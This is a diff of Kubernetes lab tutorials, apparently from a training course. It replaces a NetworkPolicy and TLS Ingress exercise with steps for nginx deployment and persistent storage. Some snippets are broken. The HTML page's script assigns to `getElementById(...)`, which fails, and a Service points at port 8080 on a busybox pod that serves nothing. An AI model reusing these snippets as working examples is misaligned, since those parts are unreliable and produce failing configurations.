+
+    Apply the deployment manifest:
+
+kubectl apply -f nginx-deployment.yaml
+
+    Verify the deployment was created successfully:
+
+kubectl get deployments
+
+    Check the status of the pods:
+
+kubectl get pods -l app=nginx-standalone
+
+    Wait for all pods to be in the "Running" status. You can watch the status in real-time:
+
+kubectl get pods -l app=nginx-standalone -w
+
+Press Ctrl+C to stop watching once all pods are running.
+Subtask 1.4: Verify Application Details
+
+    Get detailed information about the deployment:
+
+kubectl describe deployment nginx-standalone-app
+
+    Check the replica set created by the deployment:
+
+kubectl get replicasets -l app=nginx-standalone
+
+Task 2: Expose the Application Externally Using a NodePort Service
+Subtask 2.1: Create the NodePort Service Manifest
+
+    Create a service manifest file:
+
+nano nginx-service.yaml
+
+    Add the following YAML content:
+
+apiVersion: v1
+kind: Service
+metadata:
+  name: nginx-standalone-service
+  labels:
+    app: nginx-standalone
+spec:
+  type: NodePort
+  selector:
+    app: nginx-standalone
+  ports:
+  - port: 80
+    targetPort: 80
+    nodePort: 30080
+    protocol: TCP
+    name: http
+
+    Save and exit the file
+
+Subtask 2.2: Deploy the Service
+
+    Apply the service manifest:
+
+kubectl apply -f nginx-service.yaml
+
+    Verify the service was created:
+
+kubectl get services
+
+    Get detailed information about the service:
+
+kubectl describe service nginx-standalone-service
+
+Subtask 2.3: Test External Access
+
+    Get the cluster IP address:
+
+minikube ip
+
+    Test the application accessibility using curl:
+
+curl http://$(minikube ip):30080
+
+You should see the default NGINX welcome page HTML content.
+
+    Alternatively, you can access the application through your browser. Get the full URL:
+
+echo "Access your application at: http://$(minikube ip):30080"
+
+Subtask 2.4: Verify Service Endpoints
+
+    Check the service endpoints to ensure they're pointing to your pods:
+
+kubectl get endpoints nginx-standalone-service
+
+    Compare the endpoint IPs with your pod IPs:
+
+kubectl get pods -l app=nginx-standalone -o wide
+
+Task 3: Monitor Application Logs and Resource Metrics
+Subtask 3.1: Monitor Application Logs
+
+    View logs from all pods in the deployment:
+
+kubectl logs -l app=nginx-standalone
+
+    Follow logs in real-time from a specific pod:
+
+# First, get a pod name
+kubectl get pods -l app=nginx-standalone
+
+# Then follow logs (replace POD_NAME with actual pod name)
+kubectl logs -f POD_NAME
+
+    Generate some traffic to create log entries:
+
+# In a new terminal, run this command multiple times
+curl http://$(minikube ip):30080
+
+    View logs from the last 10 minutes:
+
+kubectl logs -l app=nginx-standalone --since=10m
+
+Subtask 3.2: Monitor Resource Usage
+
+    Check resource usage for your pods:
+
+kubectl top pods -l app=nginx-standalone
+
+    Monitor resource usage for the entire cluster:
+
+kubectl top nodes
+
+    Get detailed resource information for a specific pod:
+
+# Replace POD_NAME with an actual pod name
+kubectl describe pod POD_NAME
+
+Subtask 3.3: Monitor Application Health
+
+    Check the readiness and liveness of your pods:
+
+kubectl get pods -l app=nginx-standalone -o wide
+
+    View events related to your deployment:
+
+kubectl get events --field-selector involvedObject.name=nginx-standalone-app
+
+    Monitor the deployment status:
+
+kubectl rollout status deployment/nginx-standalone-app
+
+Subtask 3.4: Create a Custom HTML Page
+
+Let's customize our application to make monitoring more interesting.
+
+    Create a custom HTML file:
+
+cat > custom-index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Kubernetes Lab 10 - Stand-Alone App</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f0f8ff; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        h1 { color: #2c3e50; text-align: center; }
+        .info { background: #e8f4fd; padding: 15px; border-radius: 5px; margin: 20px 0; }
+        .success { color: #27ae60; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Kubernetes Stand-Alone Application</h1>
+        <div class="info">
+            <h3>Lab 10 Deployment Successful!</h3>
+            <p><span class="success">✓</span> Application deployed using Kubernetes Deployment</p>
+            <p><span class="success">✓</span> Service exposed via NodePort (30080)</p>
+            <p><span class="success">✓</span> Multiple replicas running for high availability</p>
+            <p><span class="success">✓</span> Resource limits and requests configured</p>
+        </div>
+        <p><strong>Hostname:</strong> <span id="hostname">Loading...</span></p>
+        <p><strong>Timestamp:</strong> <span id="timestamp"></span></p>
+    </div>
+    <script>
+        document.getElementById('hostname') = window.location.hostname;
+        document.getElementById('timestamp').textContent = new Date().toLocaleString();
+    </script>
+</body>
+</html>
+EOF
+
+    Create a ConfigMap with the custom HTML:
+
+kubectl create configmap nginx-custom-html --from-file=index.html=custom-index.html
+
+    Update the deployment to use the custom HTML:
+
+cat > nginx-deployment-updated.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx-standalone-app
+  labels:
+    app: nginx-standalone
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: nginx-standalone
+  template:
+    metadata:
+      labels:
+        app: nginx-standalone
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:1.25.3
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "250m"
+          limits:
+            memory: "128Mi"
+            cpu: "500m"
+        volumeMounts:
+        - name: html-volume
+          mountPath: /usr/share/nginx/html
+      volumes:
+      - name: html-volume
+        configMap:
+          name: nginx-custom-html
+EOF
+
+    Apply the updated deployment:
+
+kubectl apply -f nginx-deployment-updated.yaml
+
+    Wait for the rollout to complete:
+
+kubectl rollout status deployment/nginx-standalone-app
+
+    Test the updated application:
+
+curl http://$(minikube ip):30080
+
+Troubleshooting Common Issues
+Issue 1: Pods Not Starting
+
+If your pods are not starting, check the following:
+
+# Check pod status and events
+kubectl describe pods -l app=nginx-standalone
+
+# Check if the image can be pulled
+kubectl get events --sort-by=.metadata.creationTimestamp
+
+Issue 2: Service Not Accessible
+
+If you can't access the service externally:
+
+# Verify service configuration
+kubectl get svc nginx-standalone-service -o yaml
+
+# Check if minikube tunnel is needed (for some environments)
+minikube service nginx-standalone-service --url
+
+Issue 3: Resource Issues
+
+If pods are pending due to resource constraints:
+
+# Check node resources
+kubectl describe nodes
+
+# Check resource requests vs available
+kubectl top nodes
+
+Lab Cleanup
+
+When you're finished with the lab, clean up the resources:
+
+# Delete the service
+kubectl delete service nginx-standalone-service
+
+# Delete the deployment
+kubectl delete deployment nginx-standalone-app
+
+# Delete the ConfigMap
+kubectl delete configmap nginx-custom-html
+
+# Verify cleanup
+kubectl get all -l app=nginx-standalone
+
+Conclusion
+
+Congratulations! You have successfully completed Lab 10: Deploying a Stand-Alone Application in Kubernetes.
+What You Accomplished
+
+In this lab, you have:
+
+• Created and deployed a Kubernetes Deployment - You learned how to write YAML manifests to define application deployments with multiple replicas, resource limits, and container specifications
+
+• Exposed applications externally - You successfully configured a NodePort service to make your application accessible from outside the Kubernetes cluster
+
+• Monitored application health and performance - You gained hands-on experience with kubectl commands for viewing logs, checking resource usage, and monitoring application status
+
+• Implemented best practices - You applied resource requests and limits, used labels for organization, and configured proper service selectors
+Why This Matters
+
+Understanding how to deploy stand-alone applications in Kubernetes is fundamental for:
+
+• Production deployments - These skills form the foundation for deploying real-world applications in Kubernetes environments
+
+• Cloud-native development - Modern applications increasingly rely on container orchestration platforms like Kubernetes
+
+• Career advancement - These skills are essential for roles in DevOps, Site Reliability Engineering, and Cloud Architecture
+
+• KCNA certification preparation - This lab directly supports your preparation for the Kubernetes and Cloud Native Associate certification
+
+The concepts you've learned here - Deployments, Services, resource management, and monitoring - are building blocks for more advanced Kubernetes topics like StatefulSets, Ingress controllers, and service meshes. You now have practical experience with the core workflow of deploying and managing applications in Kubernetes, which will serve as a solid foundation for your continued learning in cloud-native technologies.
+
+
+
+
+Lab 11: Managing Kubernetes Volumes and Persistent Storage
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Understand the difference between Volumes, PersistentVolumes (PV), and PersistentVolumeClaims (PVC) • Create and configure PersistentVolumes with different storage classes • Create PersistentVolumeClaims to request storage resources • Deploy applications that utilize persistent storage • Verify data persistence across pod restarts and deletions • Troubleshoot common storage-related issues in Kubernetes • Implement best practices for managing persistent data in containerized applications
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Kubernetes concepts (Pods, Deployments, Services) • Familiarity with YAML syntax and Kubernetes manifest files • Basic Linux command-line knowledge • Understanding of file systems and storage concepts • Completed previous Kubernetes labs or equivalent experience
+Ready-to-Use Cloud Machines
+
+Al Nafi provides pre-configured Linux-based cloud machines for this lab. Simply click Start Lab to access your environment. Your machine comes with:
+
+• Kubernetes cluster (minikube) pre-installed and configured • kubectl command-line tool ready to use • All necessary permissions and tools configured • No need to build your own VM or install software
+Lab Environment Setup
+Task 1: Verify Kubernetes Cluster Status
+Subtask 1.1: Check Cluster Information
+
+First, let's verify that your Kubernetes cluster is running properly.
+
+# Check cluster status
+kubectl cluster-info
+
+# Verify nodes are ready
+kubectl get nodes
+
+# Check available storage classes
+kubectl get storageclass
+
+Expected Output:
+
+NAME                 PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE
+standard (default)   k8s.io/minikube-hostpath   Delete          Immediate           false                  5m
+
+Subtask 1.2: Create Lab Namespace
+
+Create a dedicated namespace for this lab to keep resources organized.
+
+# Create namespace for the lab
+kubectl create namespace storage-lab
+
+# Set the namespace as default for this session
+kubectl config set-context --current --namespace=storage-lab
+
+# Verify namespace creation
+kubectl get namespaces
+
+Task 2: Create PersistentVolume and PersistentVolumeClaim
+Subtask 2.1: Create a PersistentVolume
+
+A PersistentVolume (PV) is a piece of storage in the cluster that has been provisioned by an administrator or dynamically provisioned using Storage Classes.
+
+Create a file named persistent-volume.yaml:
+
+cat > persistent-volume.yaml << 'EOF'
+apiVersion: v1
+kind: PersistentVolume
+metadata:
+  name: lab-pv
+  labels:
+    type: local
+spec:
+  storageClassName: manual
+  capacity:
+    storage: 1Gi
+  accessModes:
+    - ReadWriteOnce
+  hostPath:
+    path: "/tmp/lab-data"
+  persistentVolumeReclaimPolicy: Retain
+EOF
+
+Key Configuration Explained: • storageClassName: manual - Custom storage class for this lab • capacity: 1Gi - Allocates 1 gigabyte of storage • accessModes: ReadWriteOnce - Can be mounted by one node at a time • hostPath - Uses local node storage (suitable for single-node clusters) • persistentVolumeReclaimPolicy: Retain - Data persists after PVC deletion
+
+Apply the PersistentVolume:
+
+# Create the PersistentVolume
+kubectl apply -f persistent-volume.yaml
+
+# Verify PV creation
+kubectl get pv
+
+# Get detailed information about the PV
+kubectl describe pv lab-pv
+
+Subtask 2.2: Create a PersistentVolumeClaim
+
+A PersistentVolumeClaim (PVC) is a request for storage by a user. It's similar to a Pod requesting compute resources.
+
+Create a file named persistent-volume-claim.yaml:
+
+cat > persistent-volume-claim.yaml << 'EOF'
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+  name: lab-pvc
+  namespace: storage-lab
+spec:
+  storageClassName: manual
+  accessModes:
+    - ReadWriteOnce
+  resources:
+    requests:
+      storage: 500Mi
+EOF
+
+Key Configuration Explained: • storageClassName: manual - Must match the PV's storage class • accessModes: ReadWriteOnce - Must be compatible with PV access modes • requests.storage: 500Mi - Requests 500 megabytes (less than PV capacity)
+
+Apply the PersistentVolumeClaim:
+
+# Create the PVC
+kubectl apply -f persistent-volume-claim.yaml
+
+# Check PVC status
+kubectl get pvc
+
+# Verify PV is now bound to PVC
+kubectl get pv
+
+# Get detailed PVC information
+kubectl describe pvc lab-pvc
+
+Expected Status: The PVC should show Bound status, and the PV should show Bound to storage-lab/lab-pvc.
+Task 3: Deploy Application with Persistent Storage
+Subtask 3.1: Create Application Deployment
+
+Now we'll deploy an application that writes data to the persistent volume to demonstrate data persistence.
+
+Create a file named storage-app-deployment.yaml:
+
+cat > storage-app-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: storage-app
+  namespace: storage-lab
+  labels:
+    app: storage-app
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: storage-app
+  template:
+    metadata:
+      labels:
+        app: storage-app
+    spec:
+      containers:
+      - name: storage-container
+        image: busybox:1.35
+        command: ["/bin/sh"]
+        args: ["-c", "while true; do echo $(date) >> /data/timestamps.log; sleep 30; done"]
+        volumeMounts:
+        - name: storage-volume
+          mountPath: /data
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "50m"
+          limits:
+            memory: "128Mi"
+            cpu: "100m"
+      volumes:
+      - name: storage-volume
+        persistentVolumeClaim:
+          claimName: lab-pvc
+EOF
+
+Application Behavior Explained: • busybox:1.35 - Lightweight Linux container • Command - Writes timestamp to /data/timestamps.log every 30 seconds • volumeMounts - Mounts PVC at /data path inside container • Resource limits - Prevents resource overconsumption
+
+Deploy the application:
+
+# Deploy the application
+kubectl apply -f storage-app-deployment.yaml
+
+# Check deployment status
+kubectl get deployments
+
+# Check pod status
+kubectl get pods
+
+# Wait for pod to be running
+kubectl wait --for=condition=Ready pod -l app=storage-app --timeout=60s
+
+Subtask 3.2: Verify Data Writing
+
+Let's verify that the application is successfully writing data to the persistent volume.
+
+# Get the pod name
+POD_NAME=$(kubectl get pods -l app=storage-app -o jsonpath='{.items[0].metadata.name}')
+
+# Check if data is being written
+kubectl exec $POD_NAME -- ls -la /data
+
+# View the content of the log file
+kubectl exec $POD_NAME -- cat /data/timestamps.log
+
+# Monitor real-time data writing (press Ctrl+C to stop)
+kubectl exec $POD_NAME -- tail -f /data/timestamps.log
+
+Expected Output: You should see timestamps being written to the file every 30 seconds.
+Subtask 3.3: Create Service for Application Access
+
+Create a service to access the application:
+
+cat > storage-app-service.yaml << 'EOF'
+apiVersion: v1
+kind: Service
+metadata:
+  name: storage-app-service
+  namespace: storage-lab
+spec:
+  selector:
+    app: storage-app
+  ports:
     - protocol: TCP
       port: 80
-  egress:
-  - to:
-    - namespaceSelector:
-        matchLabels:
-          name: database
-    ports:
-    - protocol: TCP
-      port: 5432
-  - to: {}
-    ports:
-    - protocol: UDP
-      port: 53
+      targetPort: 8080
+  type: ClusterIP
+EOF
 
-Apply the NetworkPolicy:
+# Apply the service
+kubectl apply -f storage-app-service.yaml
 
-# First, label the namespaces for the policy to work
-kubectl label namespace frontend name=frontend
-kubectl label namespace backend name=backend
-kubectl label namespace database name=database
+# Verify service creation
+kubectl get services
 
-# Apply the NetworkPolicy
-kubectl apply -f backend-network-policy.yaml
+Task 4: Verify Data Persistence
+Subtask 4.1: Delete and Recreate Application
 
-Subtask 1.4: Create NetworkPolicy for Database Namespace
+Now we'll test the core functionality of persistent storage by deleting the application and verifying that data persists.
 
-Create a NetworkPolicy that only allows traffic from the backend namespace to the database namespace.
+# First, let's see how much data we have
+kubectl exec $POD_NAME -- wc -l /data/timestamps.log
 
-Create a file named database-network-policy.yaml:
+# Note the current timestamp count
+INITIAL_COUNT=$(kubectl exec $POD_NAME -- wc -l /data/timestamps.log | awk '{print $1}')
+echo "Initial line count: $INITIAL_COUNT"
 
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
+# Delete the deployment (this will delete the pod)
+kubectl delete deployment storage-app
+
+# Verify pod is deleted
+kubectl get pods
+
+# Wait a moment to ensure complete deletion
+sleep 10
+
+Subtask 4.2: Recreate Application and Verify Data
+
+# Recreate the deployment
+kubectl apply -f storage-app-deployment.yaml
+
+# Wait for new pod to be ready
+kubectl wait --for=condition=Ready pod -l app=storage-app --timeout=60s
+
+# Get new pod name
+NEW_POD_NAME=$(kubectl get pods -l app=storage-app -o jsonpath='{.items[0].metadata.name}')
+
+# Check if our data still exists
+kubectl exec $NEW_POD_NAME -- ls -la /data
+
+# Verify the log file still contains our previous data
+kubectl exec $NEW_POD_NAME -- head -5 /data/timestamps.log
+
+# Check current line count
+CURRENT_COUNT=$(kubectl exec $NEW_POD_NAME -- wc -l /data/timestamps.log | awk '{print $1}')
+echo "Current line count: $CURRENT_COUNT"
+
+# The count should be equal or greater than initial count
+if [ $CURRENT_COUNT -ge $INITIAL_COUNT ]; then
+    echo "SUCCESS: Data persisted across pod deletion and recreation!"
+else
+    echo "WARNING: Some data may have been lost"
+fi
+
+Subtask 4.3: Advanced Persistence Testing
+
+Let's perform additional tests to thoroughly verify persistence:
+
+# Create a test file with specific content
+kubectl exec $NEW_POD_NAME -- sh -c 'echo "Persistence Test - $(date)" > /data/test-file.txt'
+
+# Add some structured data
+kubectl exec $NEW_POD_NAME -- sh -c 'echo "Lab: Kubernetes Persistent Storage" >> /data/test-file.txt'
+kubectl exec $NEW_POD_NAME -- sh -c 'echo "Student: $(whoami)" >> /data/test-file.txt'
+kubectl exec $NEW_POD_NAME -- sh -c 'echo "Node: $(hostname)" >> /data/test-file.txt'
+
+# Verify file creation
+kubectl exec $NEW_POD_NAME -- cat /data/test-file.txt
+
+# Scale deployment to 0 replicas (another way to delete pods)
+kubectl scale deployment storage-app --replicas=0
+
+# Verify no pods are running
+kubectl get pods
+
+# Scale back to 1 replica
+kubectl scale deployment storage-app --replicas=1
+
+# Wait for pod to be ready
+kubectl wait --for=condition=Ready pod -l app=storage-app --timeout=60s
+
+# Get newest pod name
+FINAL_POD_NAME=$(kubectl get pods -l app=storage-app -o jsonpath='{.items[0].metadata.name}')
+
+# Verify our test file still exists
+kubectl exec $FINAL_POD_NAME -- cat /data/test-file.txt
+
+echo "Final persistence test completed successfully!"
+
+Task 5: Storage Management and Monitoring
+Subtask 5.1: Monitor Storage Usage
+
+# Check storage usage inside the pod
+kubectl exec $FINAL_POD_NAME -- df -h /data
+
+# Check PV and PVC status
+kubectl get pv,pvc
+
+# Get detailed storage information
+kubectl describe pv lab-pv
+kubectl describe pvc lab-pvc
+
+# Check events related to storage
+kubectl get events --field-selector involvedObject.kind=PersistentVolume
+kubectl get events --field-selector involvedObject.kind=PersistentVolumeClaim
+
+Subtask 5.2: Create Storage Monitoring Script
+
+Create a script to monitor storage usage:
+
+cat > monitor-storage.sh << 'EOF'
+#!/bin/bash
+
+echo "=== Kubernetes Storage Monitoring ==="
+echo "Date: $(date)"
+echo
+
+echo "=== PersistentVolumes ==="
+kubectl get pv -o wide
+
+echo
+echo "=== PersistentVolumeClaims ==="
+kubectl get pvc -o wide
+
+echo
+echo "=== Storage Usage in Pod ==="
+POD_NAME=$(kubectl get pods -l app=storage-app -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
+if [ ! -z "$POD_NAME" ]; then
+    echo "Pod: $POD_NAME"
+    kubectl exec $POD_NAME -- df -h /data 2>/dev/null || echo "Pod not ready or not found"
+    echo "Files in /data:"
+    kubectl exec $POD_NAME -- ls -la /data 2>/dev/null || echo "Cannot access /data"
+else
+    echo "No storage-app pods found"
+fi
+
+echo
+echo "=== Recent Storage Events ==="
+kubectl get events --field-selector involvedObject.kind=PersistentVolume,involvedObject.kind=PersistentVolumeClaim --sort-by='.lastTimestamp' | tail -5
+EOF
+
+# Make script executable
+chmod +x monitor-storage.sh
+
+# Run the monitoring script
+./monitor-storage.sh
+
+Task 6: Advanced Storage Scenarios
+Subtask 6.1: Create Multiple PVCs
+
+Let's create additional PVCs to understand storage allocation:
+
+# Create additional PV
+cat > additional-pv.yaml << 'EOF'
+apiVersion: v1
+kind: PersistentVolume
 metadata:
-  name: database-network-policy
-  namespace: database
+  name: lab-pv-2
+  labels:
+    type: local
 spec:
-  podSelector: {}
-  policyTypes:
-  - Ingress
-  ingress:
-  - from:
-    - namespaceSelector:
-        matchLabels:
-          name: backend
-    ports:
-    - protocol: TCP
-      port: 5432
+  storageClassName: manual
+  capacity:
+    storage: 2Gi
+  accessModes:
+    - ReadWriteOnce
+  hostPath:
+    path: "/tmp/lab-data-2"
+  persistentVolumeReclaimPolicy: Retain
+EOF
 
-Apply the NetworkPolicy:
+# Apply additional PV
+kubectl apply -f additional-pv.yaml
 
-kubectl apply -f database-network-policy.yaml
-
-Subtask 1.5: Create NetworkPolicy for Frontend Namespace
-
-Create a NetworkPolicy for the frontend namespace that allows ingress traffic and egress to backend.
-
-Create a file named frontend-network-policy.yaml:
-
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
+# Create second PVC
+cat > additional-pvc.yaml << 'EOF'
+apiVersion: v1
+kind: PersistentVolumeClaim
 metadata:
-  name: frontend-network-policy
-  namespace: frontend
+  name: lab-pvc-2
+  namespace: storage-lab
 spec:
-  podSelector: {}
-  policyTypes:
-  - Ingress
-  - Egress
-  ingress:
-  - {}
-  egress:
-  - to:
-    - namespaceSelector:
-        matchLabels:
-          name: backend
-    ports:
-    - protocol: TCP
-      port: 80
-  - to: {}
-    ports:
-    - protocol: UDP
-      port: 53
+  storageClassName: manual
+  accessModes:
+    - ReadWriteOnce
+  resources:
+    requests:
+      storage: 1Gi
+EOF
 
-Apply the NetworkPolicy:
+# Apply additional PVC
+kubectl apply -f additional-pvc.yaml
 
-kubectl apply -f frontend-network-policy.yaml
+# Check all PVs and PVCs
+kubectl get pv,pvc
 
-Task 2: Deploy Ingress Resource with TLS Termination
-Subtask 2.1: Generate SSL/TLS Certificate
+Subtask 6.2: Deploy Multi-Volume Application
 
-Create a self-signed certificate for testing purposes:
+Create an application that uses multiple volumes:
 
-# Create a private key
-openssl genrsa -out tls.key 2048
+cat > multi-volume-app.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: multi-volume-app
+  namespace: storage-lab
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: multi-volume-app
+  template:
+    metadata:
+      labels:
+        app: multi-volume-app
+    spec:
+      containers:
+      - name: multi-volume-container
+        image: busybox:1.35
+        command: ["/bin/sh"]
+        args: ["-c", "while true; do echo 'Volume 1: '$(date) >> /data1/log1.txt; echo 'Volume 2: '$(date) >> /data2/log2.txt; sleep 45; done"]
+        volumeMounts:
+        - name: volume-1
+          mountPath: /data1
+        - name: volume-2
+          mountPath: /data2
+      volumes:
+      - name: volume-1
+        persistentVolumeClaim:
+          claimName: lab-pvc
+      - name: volume-2
+        persistentVolumeClaim:
+          claimName: lab-pvc-2
+EOF
 
-# Create a certificate signing request
-openssl req -new -key tls.key -out tls.csr -subj "/CN=secure-app.local/O=secure-app"
+# Deploy multi-volume application
+kubectl apply -f multi-volume-app.yaml
 
-# Generate the certificate
-openssl x509 -req -in tls.csr -signkey tls.key -out tls.crt -days 365
+# Wait for pod to be ready
+kubectl wait --for=condition=Ready pod -l app=multi-volume-app --timeout=60s
 
-Create a Kubernetes secret with the certificate:
+# Get pod name
+MULTI_POD=$(kubectl get pods -l app=multi-volume-app -o jsonpath='{.items[0].metadata.name}')
 
-kubectl create secret tls secure-app-tls --cert=tls.crt --key=tls.key -n frontend
+# Verify both volumes are mounted
+kubectl exec $MULTI_POD -- df -h | grep data
+kubectl exec $MULTI_POD -- ls -la /data1
+kubectl exec $MULTI_POD -- ls -la /data2
 
-Subtask 2.2: Create Ingress Resource with TLS
+# Check logs in both volumes
+sleep 60
+kubectl exec $MULTI_POD -- cat /data1/log1.txt
+kubectl exec $MULTI_POD -- cat /data2/log2.txt
 
-Create a file named secure-ingress.yaml:
+Task 7: Troubleshooting and Best Practices
+Subtask 7.1: Common Issues and Solutions
 
+Let's explore common storage issues and their solutions:
+
+# Create a problematic PVC (requesting more storage than available)
+cat > problematic-pvc.yaml << 'EOF'
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+  name: large-pvc
+  namespace: storage-lab
+spec:
+  storageClassName: manual
+  accessModes:
+    - ReadWriteOnce
+  resources:
+    requests:
+      storage: 10Gi  # This exceeds our available PV capacity
+EOF
+
+# Apply the problematic PVC
+kubectl apply -f problematic-pvc.yaml
+
+# Check PVC status (should be Pending)
+kubectl get pvc large-pvc
+
+# Describe to see the issue
+kubectl describe pvc large-pvc
+
+# Check events to understand the problem
+kubectl get events --field-selector involvedObject.name=large-pvc
+
+echo "This PVC will remain in Pending state because no PV can satisfy the 10Gi request"
+
+Subtask 7.2: Storage Cleanup and Best Practices
+
+# Create cleanup script
+cat > cleanup-storage.sh << 'EOF'
+#!/bin/bash
+
+echo "=== Storage Cleanup Script ==="
+
+# Delete deployments first
+echo "Deleting deployments..."
+kubectl delete deployment storage-app multi-volume-app --ignore-not-found=true
+
+# Wait for pods to terminate
+echo "Waiting for pods to terminate..."
+kubectl wait --for=delete pod -l app=storage-app --timeout=60s 2>/dev/null || true
+kubectl wait --for=delete pod -l app=multi-volume-app --timeout=60s 2>/dev/null || true
+
+# Delete PVCs
+echo "Deleting PVCs..."
+kubectl delete pvc lab-pvc lab-pvc-2 large-pvc --ignore-not-found=true
+
+# Delete PVs
+echo "Deleting PVs..."
+kubectl delete pv lab-pv lab-pv-2 --ignore-not-found=true
+
+# Delete service
+echo "Deleting service..."
+kubectl delete service storage-app-service --ignore-not-found=true
+
+echo "Cleanup completed!"
+
+# Show remaining resources
+echo "Remaining storage resources:"
+kubectl get pv,pvc
+EOF
+
+# Make cleanup script executable
+chmod +x cleanup-storage.sh
+
+Subtask 7.3: Storage Best Practices Summary
+
+Create a best practices documentation:
+
+cat > storage-best-practices.md << 'EOF'
+# Kubernetes Storage Best Practices
+
+## 1. Storage Class Selection
+- Use appropriate storage classes for different workloads
+- Consider performance requirements (SSD vs HDD)
+- Plan for backup and disaster recovery
+
+## 2. Resource Management
+- Set appropriate storage requests and limits
+- Monitor storage usage regularly
+- Implement storage quotas in namespaces
+
+## 3. Data Persistence Strategy
+- Use StatefulSets for stateful applications
+- Implement proper backup strategies
+- Consider data replication for critical applications
+
+## 4. Security Considerations
+- Use proper RBAC for storage resources
+- Encrypt sensitive data at rest
+- Implement network policies for storage access
+
+## 5. Monitoring and Alerting
+- Monitor PV/PVC status regularly
+- Set up alerts for storage capacity
+- Track storage performance metrics
+
+## 6. Cleanup and Maintenance
+- Regularly clean up unused PVCs
+- Monitor orphaned PVs
+- Implement retention policies
+EOF
+
+echo "Best practices documentation created: storage-best-practices.md"
+
+Verification and Testing
+Final Verification Steps
+
+Let's perform a comprehensive verification of everything we've learned:
+
+# Run comprehensive verification
+cat > final-verification.sh << 'EOF'
+#!/bin/bash
+
+echo "=== Final Lab Verification ==="
+echo "Date: $(date)"
+echo
+
+# Check if main components exist
+echo "1. Checking PersistentVolumes..."
+kubectl get pv | grep -E "(lab-pv|lab-pv-2)" && echo "✓ PVs found" || echo "✗ PVs missing"
+
+echo
+echo "2. Checking PersistentVolumeClaims..."
+kubectl get pvc | grep -E "(lab-pvc|lab-pvc-2)" && echo "✓ PVCs found" || echo "✗ PVCs missing"
+
+echo
+echo "3. Checking Applications..."
+kubectl get deployments | grep -E "(storage-app|multi-volume-app)" && echo "✓ Applications found" || echo "✗ Applications missing"
+
+echo
+echo "4. Checking Data Persistence..."
+STORAGE_POD=$(kubectl get pods -l app=storage-app -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
+if [ ! -z "$STORAGE_POD" ]; then
+    if kubectl exec $STORAGE_POD -- test -f /data/timestamps.log 2>/dev/null; then
+        LINE_COUNT=$(kubectl exec $STORAGE_POD -- wc -l /data/timestamps.log | awk '{print $1}')
+        echo "✓ Data persistence verified - $LINE_COUNT log entries found"
+    else
+        echo "✗ Data persistence failed - log file not found"
+    fi
+else
+    echo "✗ Storage app pod not found"
+fi
+
+echo
+echo "5. Checking Multi-Volume Setup..."
+MULTI_POD=$(kubectl get pods -l app=multi-volume-app -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
+if [ ! -z "$MULTI_POD" ]; then
+    if kubectl exec $MULTI_POD -- test -f /data1/log1.txt 2>/dev/null && kubectl exec $MULTI_POD -- test -f /data2/log2.txt 2>/dev/null; then
+        echo "✓ Multi-volume setup verified"
+    else
+        echo "✗ Multi-volume setup failed"
+    fi
+else
+    echo "✗ Multi-volume app pod not found"
+fi
+
+echo
+echo "=== Verification Complete ==="
+EOF
+
+chmod +x final-verification.sh
+./final-verification.sh
+
+Troubleshooting Common Issues
+Issue 1: PVC Stuck in Pending State
+
+Symptoms: PVC shows "Pending" status indefinitely
+
+Diagnosis:
+
+kubectl describe pvc <pvc-name>
+kubectl get events --field-selector involvedObject.name=<pvc-name>
+
+Common Causes and Solutions:
+
+    No matching PV available - Create PV with matching storage class and capacity
+    Access mode mismatch - Ensure PV and PVC have compatible access modes
+    Storage class not found - Verify storage class exists and is spelled correctly
+
+Issue 2: Pod Cannot Mount Volume
+
+Symptoms: Pod stuck in "ContainerCreating" state
+
+Diagnosis:
+
+kubectl describe pod <pod-name>
+kubectl get events --field-selector involvedObject.name=<pod-name>
+
+Common Solutions:
+
+    Check if PVC is bound to a PV
+    Verify volume mount paths in pod specification
+    Ensure node has necessary permissions for hostPath volumes
+
+Issue 3: Data Not Persisting
+
+Symptoms: Data disappears after pod restart
+
+Diagnosis:
+
+kubectl get pv,pvc
+kubectl describe pv <pv-name>
+
+Common Causes:
+
+    Using emptyDir instead of PVC
+    PV reclaim policy set to "Delete"
+    Volume not properly mounted in container
+
+Conclusion
+
+Congratulations! You have successfully completed Lab 11: Managing Kubernetes Volumes and Persistent Storage.
+What You Accomplished
+
+In this comprehensive lab, you have:
+
+    Created and Configured Persistent Storage
+        Set up PersistentVolumes with proper specifications
+        Created PersistentVolumeClaims to request storage resources
+        Understood the relationship between PVs, PVCs, and storage classes
+
+    Deployed Applications with Persistent Data
+        Deployed applications that write data to persistent volumes
+        Configured volume mounts and storage paths
+        Implemented resource limits and best practices
+
+    Verified Data Persistence
+        Tested data persistence across pod deletions and recreations
+        Verified that data survives application restarts
+        Demonstrated the core value of persistent storage in Kubernetes
+
+    Explored Advanced Storage Scenarios
+        Worked with multiple volumes in a single application
+        Understood storage allocation and management
+        Implemented monitoring and troubleshooting procedures
+
+    Applied Best Practices
+        Learned storage security considerations
+        Implemented proper cleanup procedures
+        Understood performance and scalability implications
+
+Why This Matters
+
